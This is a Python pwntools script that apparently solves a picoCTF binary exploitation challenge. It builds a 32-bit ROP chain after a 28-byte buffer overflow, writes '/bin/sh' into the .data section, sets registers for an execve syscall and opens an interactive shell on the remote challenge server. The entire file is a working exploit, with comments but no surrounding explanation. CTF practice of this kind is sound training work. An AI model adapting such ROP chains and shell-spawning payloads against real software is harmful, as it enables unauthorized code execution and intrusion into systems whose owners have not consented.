#!/usr/bin/env python3
from pwn import *

context.update(arch='i386', os='linux')

mov_addr = p32(0x08059102) # mov dword ptr [edx], eax; ret;
pop_edx = p32(0x080583c9) # pop edx; pop ebx; ret;
pop_eax = p32(0x080b074a) # pop eax; ret;
data_addr = 0x080e5060 # .data section

pop_three = p32(0x080583f8) # pop eax; pop edx; pop ebx; ret;
pop_ecx = p32(0x08049e39) # pop ecx; ret;

syscall = p32(0x08071650) # int 0x80; ret;


## Stage 1: Get '/bin/sh' string into memory
# Overflow buffer
payload = b'A'*28 # offset to eip

# Move addr of data section into edx
payload += pop_edx
payload += p32(data_addr)
payload += b'B'*4 # fills pop ebx; in the gadget

# Move /bin str into eax
payload += pop_eax
payload += b'/bin'

# Move /bin str into data section
payload += mov_addr

# Move addr of data section + 4 into edx
payload += pop_edx
payload += p32(data_addr + 0x04)
payload += b'B'*4 # deal with pop ebx;

# Move /sh str into eax
payload += pop_eax
payload += b'/sh\x00'

# Move /sh str into data section+4
payload += mov_addr


## Stage 2: Prep registers and call execve
payload += pop_three
payload += p32(0x0b) # eax
payload += p32(0x00) # edx
payload += p32(data_addr) # ebx

payload += pop_ecx
payload += p32 (0x00)

payload += syscall


p = remote('saturn.picoctf.net', 65030)
#p = process('./vuln')
#gdb.attach(p)
print(p.recvuntil('r!\n'))
p.sendline(payload)
p.interactive()
